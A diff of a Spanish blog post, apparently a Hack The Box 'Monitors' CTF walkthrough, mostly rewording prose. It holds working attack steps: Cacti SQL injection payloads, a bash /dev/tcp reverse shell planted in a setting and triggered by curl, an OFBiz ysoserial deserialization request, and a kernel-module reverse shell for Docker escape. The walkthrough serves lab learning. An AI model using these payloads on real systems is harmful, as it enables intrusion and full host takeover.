@@ -79,7 +79,7 @@
   </time>
   <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/1.png" alt="Info Card" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>El día de hoy vamos a estar resolviendo la máquina <em>Monitors</em> de <em>Hack The Box</em>.</p>
+<p>El día de hoy vamos a estar resolviendo la máquina <em>Monitors</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad difícil según figura en la plataforma. Pese a su dificultad, no hay que sentirse intimidados, ya que cubre diversas técnicas y vulnerabilidades, lo que la convierte en una excelente oportunidad para aprender y practicar, todo detallado paso a paso.</p>
 
 <h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
 
@@ -224,11 +224,11 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/4.png" alt="4" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es <code class="language-plaintext highlighter-rouge">monitors.htb</code>. Esto es una pista importante, ya que un dominio en el correo electrónico sugiere que el servidor está configurado con <code class="language-plaintext highlighter-rouge">virtual hosting</code>; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados.</p>
+<p>Dado que no podemos obtener más información útil desde la terminal, tendremos que visitar la página desde nuestro navegador. Al acceder, observaremos un mensaje que indica que el acceso directo por IP no está permitido y sugiere contactar con el administrador del sitio mediante un correo electrónico cuyo dominio es <code class="language-plaintext highlighter-rouge">monitors.htb</code>. Este detalle es relevante ya que el dominio en la dirección de correo electrónico puede ser una pista sobre el uso de <code class="language-plaintext highlighter-rouge">virtual hosting</code>; es decir, el servidor usa nombres de dominio específicos para identificar los sitios alojados.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/5.png" alt="5" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Para verificarlo, editamos el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.</p>
+<p>Para verificarlo, editaremos el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que el nombre de dominio se resuelva a la dirección IP del servidor correspondiente.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/6.png" alt="6" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -271,14 +271,14 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en <em>Exploit Database</em> —por ejemplo—, o directamente desde la consola usando <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
+<p>Con esta información, podemos pasar a investigar si esta versión presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer directamente desde la consola usando <code class="language-plaintext highlighter-rouge">searchsploit</code>, o buscando en línea en <em>Exploit Database</em>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit spritz
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Encontramos un exploit para este plugin en esta versión que explota una vulnerabilidad <code class="language-plaintext highlighter-rouge">Remote File Inclusion</code> (RFI).</p>
+<p>Encontramos un exploit para esta versión que explota una vulnerabilidad <code class="language-plaintext highlighter-rouge">Remote File Inclusion</code> (RFI).</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -294,7 +294,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Sin embargo, si intentamos cargar una <em>reverse shell</em>, esta no se ejecutará debido a que el <code class="language-plaintext highlighter-rouge">RFI</code> utiliza la función <code class="language-plaintext highlighter-rouge">file_get_contents</code>, que simplemente lee el contenido de un archivo o URL como texto sin interpretar o ejecutar ningún código <em>PHP</em> que contenga.</p>
+<p>Sin embargo, si intentamos cargar una <em>reverse shell</em>, esta no se ejecutará debido a que el <code class="language-plaintext highlighter-rouge">RFI</code> utiliza la función <code class="language-plaintext highlighter-rouge">file_get_contents</code>, que simplemente lee el contenido del archivo como texto, sin interpretar o ejecutar ningún código <em>PHP</em> que contenga.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -377,14 +377,16 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png" alt="33" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Para acceder, en la interfaz de <code class="language-plaintext highlighter-rouge">Cacti</code>, vamos al menú izquierdo, en la sección <em>Presets</em>, donde se encuentra la opción <em>Color</em>. Aquí se despliega una tabla con diversas configuraciones de colores. La vulnerabilidad se explota usando el parámetro <code class="language-plaintext highlighter-rouge">filter</code>, al que podemos inyectar comandos SQL para manipular las consultas a la base de datos en la URL que aparece a continuación:</p>
+<p>En la interfaz de <code class="language-plaintext highlighter-rouge">Cacti</code>, la vulnerabilidad se localiza en el parámetro <code class="language-plaintext highlighter-rouge">filter</code> de la siguiente URL:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1
 </code></pre></div></div>
 
+<p>Este parámetro se encuentra en la sección <em>Presets</em> del menú izquierdo, bajo la opción <em>Color</em>, que despliega una tabla con una lista de colores y sus propiedades. Manipulando este parámetro, podemos inyectar comandos SQL y alterar las consultas a la base de datos.</p>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/34.png" alt="34" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Comenzaremos inyectando el payload clásico <code class="language-plaintext highlighter-rouge">')+UNION+SELECT+NULL;--+-</code> para calcular el número de columnas en la consulta.</p>
+<p>Comenzaremos inyectando el <em>payload</em> clásico <code class="language-plaintext highlighter-rouge">')+UNION+SELECT+NULL;--+-</code> para calcular el número de columnas en la consulta.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL;--+-
 </code></pre></div></div>
@@ -398,7 +400,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png" alt="36" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Ahora queremos listar todas las tablas en la base de datos, utilizando el payload que aparece a continuación:</p>
+<p>Ahora nos interesa listar todas las tablas de la base de datos; para ello, utilizaremos el siguiente <em>payload</em>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
 </code></pre></div></div>
@@ -426,9 +428,49 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UPDATE+settings+SET+value='bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1;'+WHERE+name='path_php_binary';--+-
 </code></pre></div></div>
 
-<p>Con esto, modificamos un valor dentro de la configuración de <code class="language-plaintext highlighter-rouge">Cacti</code> para que ejecute nuestro comando de <em>reverse shell</em>. Para activarlo, accedemos a la URL que aparece a continuación:</p>
+<p>Al modificar el parámetro <code class="language-plaintext highlighter-rouge">path_php_binary</code> en la tabla <em>settings</em> para que apunte a una <em>reverse shell</em> en lugar del ejecutable de PHP, conseguimos que el sistema ejecute nuestro comando. Esto sucede porque <code class="language-plaintext highlighter-rouge">Cacti</code> utiliza el valor de este parámetro en la función <code class="language-plaintext highlighter-rouge">host_reindex()</code>, ubicada en el archivo <a href="https://github.com/Cacti/cacti/blob/develop/host.php">host.php</a>. La lógica detrás de esto es la siguiente:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">switch</span> <span class="p">(</span><span class="nf">get_request_var</span><span class="p">(</span><span class="s1">'action'</span><span class="p">))</span> <span class="p">{</span>
+	<span class="k">case</span> <span class="s1">'reindex'</span><span class="o">:</span>
+		<span class="nf">host_reindex</span><span class="p">();</span>
+
+		<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: host.php?action=edit&amp;id='</span> <span class="mf">.</span> <span class="nf">get_request_var</span><span class="p">(</span><span class="s1">'host_id'</span><span class="p">));</span>
+
+		<span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Cuando el parámetro <em>action</em> es igual a <code class="language-plaintext highlighter-rouge">reindex</code>, se ejecuta la función <code class="language-plaintext highlighter-rouge">host_reindex()</code>, la cual utiliza la función <em>shell_exec()</em> para ejecutar el comando definido en <code class="language-plaintext highlighter-rouge">path_php_binary</code>. Esto permite que nuestra <em>reverse shell</em> se ejecute en lugar del script PHP legítimo. El código de la función <code class="language-plaintext highlighter-rouge">host_reindex()</code> es el siguiente:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">host_reindex</span><span class="p">()</span> <span class="p">{</span>    
+    <span class="k">global</span> <span class="nv">$config</span><span class="p">;</span>
+
+	<span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+
+	<span class="nb">shell_exec</span><span class="p">(</span><span class="nf">read_config_option</span><span class="p">(</span><span class="s1">'path_php_binary'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">' -q '</span> <span class="mf">.</span> <span class="no">CACTI_PATH_CLI</span> <span class="mf">.</span> <span class="s1">'/poller_reindex_hosts.php --qid=all --id='</span> <span class="mf">.</span> <span class="nf">get_filter_request_var</span><span class="p">(</span><span class="s1">'host_id'</span><span class="p">));</span>
+
+	<span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+
+	<span class="nv">$total_time</span> <span class="o">=</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
+
+	<span class="nv">$items</span> <span class="o">=</span> <span class="nf">db_fetch_cell_prepared</span><span class="p">(</span><span class="s1">'SELECT COUNT(*)
+		FROM host_snmp_cache
+		WHERE host_id = ?'</span><span class="p">,</span>
+		<span class="k">array</span><span class="p">(</span><span class="nf">get_filter_request_var</span><span class="p">(</span><span class="s1">'host_id'</span><span class="p">))</span>
+	<span class="p">);</span>
+
+	<span class="nf">raise_message</span><span class="p">(</span><span class="s1">'host_reindex'</span><span class="p">,</span> <span class="nf">__</span><span class="p">(</span><span class="s1">'Device Reindex Completed in %0.2f seconds.  There were %d items updated.'</span><span class="p">,</span> <span class="nv">$total_time</span><span class="p">,</span> <span class="nv">$items</span><span class="p">),</span> <span class="no">MESSAGE_LEVEL_INFO</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Una vez hemos modificamos el parámetro <code class="language-plaintext highlighter-rouge">path_php_binary</code>, pondremos nuestra máquina en escucha a través de <code class="language-plaintext highlighter-rouge">Netcat</code> para recibir la reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
+</code></pre></div></div>
+
+<p>Podemos dirigirnos a <a href="http://cacti-admin.monitors.htb/cacti/host.php?action=reindex">http://cacti-admin.monitors.htb/cacti/host.php?action=reindex</a> o, desde la propia consola, ejecutarla con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 </code></pre></div></div>
 
 <p>Al hacerlo, logramos establecer la <em>reverse shell</em>, obteniendo acceso directo dentro de la máquina.</p>
@@ -498,7 +540,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/48.png" alt="48" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Después de explorar un poco más la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con <em>Nmap</em>. Estos puertos, conocidos como <em>puertos internos</em>, están disponibles solo localmente. Los puertos <code class="language-plaintext highlighter-rouge">8443</code> (HTTPS), <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) y <code class="language-plaintext highlighter-rouge">53</code> (DNS) están escuchando en <code class="language-plaintext highlighter-rouge">127.0.0.1</code> y no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con <em>Nmap</em> y están disponibles para conexiones externas.</p>
+<p>Después de explorar más a fondo la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con <em>Nmap</em>. Estos puertos, conocidos como <em>puertos internos</em>, están disponibles solo localmente en la propia máquina. Los puertos <code class="language-plaintext highlighter-rouge">8443</code> (HTTPS), <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) y <code class="language-plaintext highlighter-rouge">53</code> (DNS) están configurados para aceptar conexiones únicamente desde la dirección local (127.0.0.1), por lo que no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con <em>Nmap</em> y están disponibles para conexiones externas.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -nlpt
 </code></pre></div></div>
@@ -516,7 +558,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/50.png" alt="50" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Con el <em>túnel SSH</em> configurado, accedemos al puerto web local <code class="language-plaintext highlighter-rouge">8443</code> y comenzamos a explorar la aplicación. Al realizar un <em>fuzzing</em>, descubrimos varias rutas interesantes.</p>
+<p>Con el <em>túnel SSH</em> configurado, logramos conectar al puerto web local <code class="language-plaintext highlighter-rouge">8443</code> y comenzamos a explorar la aplicación. Dado que no tenemos información clara sobre su estructura o el tipo de servicio que está corriendo, podemos aplicar <em>fuzzing</em> para descubrir rutas y directorios potenciales.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 800 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://localhost:8443/FUZZ
 </code></pre></div></div>
@@ -527,11 +569,11 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/52.png" alt="52" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Sin embargo, las rutas <code class="language-plaintext highlighter-rouge">bi</code> y <code class="language-plaintext highlighter-rouge">example</code> nos dirigen a un panel de autenticación en un sistema <code class="language-plaintext highlighter-rouge">Apache OFBiz</code>, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. En este panel también se muestra la versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code>, la cual es <code class="language-plaintext highlighter-rouge">17.12.01</code>.</p>
+<p>Por otra parte, las rutas <code class="language-plaintext highlighter-rouge">bi</code> y <code class="language-plaintext highlighter-rouge">example</code> nos dirigen a un panel de autenticación en un sistema <code class="language-plaintext highlighter-rouge">Apache OFBiz</code>, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. No obstante, lo más relevante aquí es que este panel nos proporciona la versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> que se está empleando: <code class="language-plaintext highlighter-rouge">17.12.01</code>.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png" alt="53" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Como lo hemos venido haciendo, podemos proceder a investigar si esta versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en <em>Exploit Database</em>, o directamente desde la consola con <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+<p>Como lo hemos venido haciendo, procederemos a investigar si esta versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en <em>Exploit Database</em>, o directamente desde la consola con <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit ofbiz 17.12.01
 </code></pre></div></div>
@@ -542,9 +584,9 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png" alt="55" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Primero, descargaremos <a href="https://github.com/frohoff/ysoserial">ysoserial</a>, una herramienta que nos permite generar objetos <em>Java</em> serializados con payloads maliciosos. Esto resulta útil en <code class="language-plaintext highlighter-rouge">ataques de deserialización</code>, donde al enviar un <em>objeto serializado</em> especialmente diseñado, logramos ejecutar código en el servidor si este procesa (<em>deserializa</em>) el objeto sin realizar una validación adecuada.</p>
+<p>Primero, descargaremos <a href="https://github.com/frohoff/ysoserial">ysoserial</a>, una herramienta que nos permite generar objetos <em>Java</em> serializados con <em>payloads</em> maliciosos. Esto resulta útil en <code class="language-plaintext highlighter-rouge">ataques de deserialización</code>, donde al enviar un <em>objeto serializado</em> especialmente diseñado, logramos ejecutar código en el servidor si este procesa (<em>deserializa</em>) el objeto sin realizar una validación adecuada.</p>
 
-<p>Luego, definimos una <em>reverse shell</em> con un script <em>Bash</em>. La <em>reverse shell</em> nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">shell.sh</code> con el siguiente contenido:</p>
+<p>Posteriormente, escribiremos una <em>reverse shell</em> en <em>Bash</em>. Esta <em>reverse shell</em> nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">shell.sh</code> con el siguiente contenido:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
 /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1
@@ -584,7 +626,7 @@
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
 </code></pre></div></div>
-<p>Finalmente, enviamos el segundo payload utilizando <code class="language-plaintext highlighter-rouge">curl</code> de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> y obtendremos una <em>reverse shell</em> dentro de la máquina víctima.</p>
+<p>Finalmente, enviamos el segundo <em>payload</em> utilizando <code class="language-plaintext highlighter-rouge">curl</code> de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> y obtendremos una <em>reverse shell</em> dentro de la máquina víctima.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt; PAYLOAD &lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
 </code></pre></div></div>
@@ -598,9 +640,9 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/60.png" alt="60" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Dado que somos <code class="language-plaintext highlighter-rouge">root</code>, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un <code class="language-plaintext highlighter-rouge">docker breakout</code> para conseguir acceso a la máquina anfitriona y preservar nuestro estado como <code class="language-plaintext highlighter-rouge">root</code> en el sistema de la víctima.</p>
+<p>Dado que somos <code class="language-plaintext highlighter-rouge">root</code>, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un <code class="language-plaintext highlighter-rouge">docker breakout</code> para conseguir acceso a la máquina anfitriona preservando nuestro estado como <code class="language-plaintext highlighter-rouge">root</code>.</p>
 
-<p>Por defecto, <code class="language-plaintext highlighter-rouge">Docker</code> asigna ciertas <code class="language-plaintext highlighter-rouge">capabilities</code> a los contenedores. Aunque el conjunto de <em>capabilities</em> asignado es mínimo para dificultar la explotación, existen ciertas <em>capabilities</em> que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las <em>capabilities</em> existente con el comando:</p>
+<p>Por defecto, <code class="language-plaintext highlighter-rouge">Docker</code> asigna ciertas <code class="language-plaintext highlighter-rouge">capabilities</code> a los contenedores. Aunque el conjunto de <em>capabilities</em> asignado es mínimo para dificultar la explotación, existen ciertas <em>capabilities</em> que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las <em>capabilities</em> existentes con el comando:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>capsh --print
 </code></pre></div></div>
@@ -609,11 +651,11 @@
 
 <p>Entre las <em>capabilities</em> encontradas en el contenedor, identificamos <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code> y <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>, ambas que podríamos intentar abusar. Con <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code>, podríamos escribir en el sistema de archivos de la máquina anfitriona. Sin embargo, para poder hacerlo, también debe estar presente la capability <code class="language-plaintext highlighter-rouge">CAP_DAC_READ_SEARCH</code>, lo que no ocurre en este caso, por lo que esta vía de explotación no es posible. En cambio, podemos abusar de <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>.</p>
 
-<p>Esta capability permite a los procesos cargar y descargar <em>módulos del kernel</em>, lo que significa que podemos inyectar código directamente en el <em>kernel</em> del sistema anfitrión. Al permitir la ejecución de las llamadas al sistema, esta capability proporciona acceso directo al núcleo del sistema operativo. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el <em>kernel</em> con el anfitrión, este tipo de inyección nos permite interactuar con el <em>kernel</em> de la máquina anfitriona a través del contenedor. Esto nos brinda la capacidad de comprometer totalmente el sistema al permitirnos alterar el <em>kernel</em> y, por lo tanto, eludir todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.</p>
+<p>Esta <em>capability</em> permite a los procesos cargar y descargar <em>módulos de kernel</em>, lo que nos permite inyectar código directamente en el <em>kernel</em> del sistema. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el <em>kernel</em> con sistema el anfitrión, esta <em>capability</em> nos permite interactuar con <em>él</em> a través del contenedor. Esto nos permite comprometer completamente el sistema, alterando el <em>kernel</em> y eludiendo todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.</p>
 
 <p>Para aprovechar la capability <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code> y escapar del contenedor, vamos a escribir un módulo de <em>kernel</em> que abrirá una <em>reverse shell</em> hacia nuestra máquina de atacante. Este módulo será compilado mediante un <em>Makefile</em>, y luego se inyectará en el <em>kernel</em> del sistema anfitrión para ejecutar el código.</p>
 
-<p>El archivo <code class="language-plaintext highlighter-rouge">reverse-shell.c</code> contiene el código del módulo de <em>kernel</em>:</p>
+<p>Escribiremos un archivo <code class="language-plaintext highlighter-rouge">reverse-shell.c</code> que condentrá el código del módulo de <em>kernel</em>:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
@@ -633,11 +675,11 @@
 <span class="n">module_exit</span><span class="p">(</span><span class="n">reverse_shell_exit</span><span class="p">);</span>
 </code></pre></div></div>
 
-<p>Este código define un módulo de <em>kernel</em> que utiliza la función <code class="language-plaintext highlighter-rouge">call_usermodehelper</code> para ejecutar el comando de <em>reverse shell</em> en el sistema anfitrión. Al inicializar el módulo (reverse_shell_init), se ejecuta el comando que abrirá una conexión de <em>reverse shell</em> hacia nuestra IP en el puerto <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+<p>Este código define un módulo de <em>kernel</em> que utiliza la función <code class="language-plaintext highlighter-rouge">call_usermodehelper</code> para ejecutar el comando que abrirá una <em>reverse shell</em> en el sistema anfitrión. Al inicializar el módulo a través de <code class="language-plaintext highlighter-rouge">reverse_shell_init</code>, se ejecuta el comando que establecerá una conexión hacia nuestra IP en el puerto <code class="language-plaintext highlighter-rouge">4444</code>.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/62.png" alt="62" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Por otro lado, el Makefile automatiza el proceso de compilación del módulo:</p>
+<p>Por otro lado, definiremos un archivo Makefile que automatiza el proceso de compilación del módulo:</p>
 
 <div class="language-make highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">obj-m</span> <span class="o">+=</span>reverse-shell.o
 
@@ -648,7 +690,7 @@
 	make <span class="nt">-C</span> /lib/modules/<span class="p">$(</span>shell <span class="nb">uname</span> <span class="nt">-r</span><span class="p">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="p">$(</span>PWD<span class="p">)</span> clean
 </code></pre></div></div>
 
-<p>Este <em>Makefile</em> crea el archivo binario del módulo (<code class="language-plaintext highlighter-rouge">reverse-shell.ko</code>) usando el código fuente <code class="language-plaintext highlighter-rouge">reverse-shell.c</code>. La línea <code class="language-plaintext highlighter-rouge">make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</code> le indica al compilador que use la versión del <em>kernel</em> activa en el sistema anfitrión para crear el módulo. El comando <code class="language-plaintext highlighter-rouge">make clean</code> elimina cualquier archivo generado en la compilación, manteniendo el entorno limpio.</p>
+<p>Este <em>Makefile</em> se encarga de crear el archivo binario del módulo (<code class="language-plaintext highlighter-rouge">reverse-shell.ko</code>) usando el código fuente <code class="language-plaintext highlighter-rouge">reverse-shell.c</code>. La línea <code class="language-plaintext highlighter-rouge">make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</code> le indica al compilador que utilice la versión activa del <em>kernel</em> en el sistema anfitrión para crear el módulo. Por su parte, el comando <code class="language-plaintext highlighter-rouge">make clean</code> elimina cualquier archivo generado durante la compilación, manteniendo el entorno limpio.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/63.png" alt="63" class="blog-image" onclick="expandImage(this)" /></p>
 
